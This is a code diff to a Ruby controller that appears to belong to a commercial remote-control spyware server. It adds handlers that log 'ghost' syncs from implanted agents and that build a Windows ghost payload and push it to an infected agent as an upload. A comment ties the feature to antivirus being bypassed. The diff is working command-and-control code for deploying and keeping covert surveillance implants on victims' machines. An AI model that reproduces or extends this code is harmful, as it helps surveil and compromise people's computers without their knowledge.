@@ -415,6 +415,14 @@ class AgentController < RESTController
         config.sent = Time.now.getutc.to_i if config.sent.nil? or config.sent == 0
         config.activated = Time.now.getutc.to_i
         config.save
+
+        # remove the ghost after activating it
+        if config.is_ghost_present?
+          agent.configs.create!(config: config.config)
+          config = agent.configs.last
+          config.remove_ghost
+        end
+
         trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
     end
     
@@ -628,6 +636,67 @@ class AgentController < RESTController
 
       return ok
     end
+  end
+
+  def ghost
+    require_auth_level :server
+
+    ident, instance = @params['_id'].split('-')
+
+    mongoid_query do
+      agent = Item.where({_kind: 'agent', ident: ident, instance: Regexp.new(instance.prepend('^'))}).first
+
+      trace :info, "[#{@request[:peer]}] Ghost Agent request for #{agent.ident} #{agent.instance}"
+
+      # update the stats
+      agent.stat[:last_sync] = Time.now.getutc.to_i
+      agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_GHOST
+      agent.stat[:ghost] = true
+      agent.save
+    end
+
+    #file = File.binread("c:\\putty.exe")
+    #return ok(file, {content_type: 'binary/octetstream'})
+
+    # TODO: implement this in the future (when AV will be bypassed)
+    return not_found()
+  end
+
+  def activate_ghost
+    require_auth_level :tech
+
+    agent = Item.where({_kind: 'agent', _id: @params['_id']}).first
+
+    trace :info, "[#{@request[:peer]}] Activating Ghost Agent for #{agent.name}"
+
+    factory = ::Item.where({_kind: 'factory', ident: agent.ident}).first
+    build = RCS::DB::Build.factory(:windows)
+    build.load({'_id' => factory._id})
+    build.unpack
+
+    sync = @params['sync']
+    id = agent.ident.slice(4..-1).to_i
+    instance = agent.instance.slice(0..7).to_i(16)
+
+    build.ghost({:sync => sync, :build => id, :instance => instance})
+
+    # add the upload to the agent
+    agent.upload_requests.destroy_all
+    content = File.open(File.join(build.tmpdir, 'ghost'), 'rb+') {|f| f.read}
+    agent.upload_requests.create!({filename: 'ghits', _grid: [RCS::DB::GridFS.put(content, {filename: 'ghits', content_type: 'application/octet-stream'})] })
+
+    build.clean
+
+    # duplicate the current config
+    config = agent.configs.last
+    agent.configs.create!(config: config.config)
+
+    # get the duplicated and add the ghost
+    config = agent.configs.last
+    config.user = @session[:user][:name]
+    config.add_ghost
+
+    return ok()
   end
 
 end
